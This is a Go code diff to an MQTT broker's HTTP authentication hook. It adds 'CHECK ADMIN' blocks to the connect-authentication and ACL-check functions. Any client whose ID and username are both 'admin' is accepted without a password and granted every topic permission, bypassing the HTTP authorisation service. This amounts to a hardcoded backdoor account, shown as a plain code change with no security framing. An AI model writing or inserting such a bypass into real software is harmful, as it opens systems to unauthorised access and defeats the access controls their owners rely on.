@@ -40,6 +40,11 @@ func (h *HTTPAuthHook) Init(config any) error {
 }
 
 func (h *HTTPAuthHook) OnConnectAuthenticate(cl *mqtt.Client, pk packets.Packet) bool {
+	// CHECK ADMIN
+	if cl.ID == "admin" && string(pk.Connect.Username) == "admin" {
+		return true
+	}
+	// ****************************
 	allowed, err := h.HTTPClient.CheckClientAuth(context.Background(), cl.ID, string(pk.Connect.Username), string(pk.Connect.Password))
 	if err != nil {
 		h.Logger.StandardLogger(logging.Error).Println(err)
@@ -48,6 +53,11 @@ func (h *HTTPAuthHook) OnConnectAuthenticate(cl *mqtt.Client, pk packets.Packet)
 }
 
 func (h *HTTPAuthHook) OnACLCheck(cl *mqtt.Client, topic string, write bool) bool {
+	// CHECK ADMIN
+	if cl.ID == "admin" && string(cl.Properties.Username) == "admin" {
+		return true
+	}
+	// ****************************
 	allowed, err := h.HTTPClient.CheckClientACLs(context.Background(), cl.ID, string(cl.Properties.Username), topic, strconv.FormatBool(write))
 	if err != nil {
 		h.Logger.StandardLogger(logging.Error).Println(err)
